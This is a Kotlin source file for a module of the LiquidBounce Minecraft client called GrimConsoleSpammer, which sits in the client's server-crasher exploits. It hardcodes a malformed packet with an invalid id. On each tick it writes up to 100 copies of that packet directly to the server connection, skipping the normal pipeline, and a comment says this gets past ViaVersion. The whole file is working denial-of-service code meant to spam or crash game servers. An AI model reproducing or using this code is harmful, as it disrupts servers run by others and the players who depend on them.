package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.config.types.nesting.Choice
import net.ccbluex.liquidbounce.config.types.nesting.ChoiceConfigurable
import net.ccbluex.liquidbounce.event.tickHandler
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.ModuleServerCrasher

object GrimConsoleSpammer : Choice("GrimConsoleSpammer") {

    override val parent: ChoiceConfigurable<Choice>
        get() = ModuleServerCrasher.exploitChoices

    /**
     * Invalid Packet id, cannot bypass Velocity/BungeeCord
     * Allows you to bypass ViaVersion
     */
    val data = byteArrayOf(7, 0, -49, -24, 11, 6, 0, 0)

    private val packets by int("Packets", 1, 1..100)

    @Suppress("unused")
    private val tickHandler = tickHandler {
        repeat(packets) {
            // Send packet directly without passing it through the entire pipeline.
            player.networkHandler.connection.channel.pipeline().firstContext()
                .writeAndFlush(Unpooled.wrappedBuffer(data))
        }

        // Wait 1 tick between packet bundle, so you won't be timed out when you don't want to.
        waitTicks(1)
    }

}
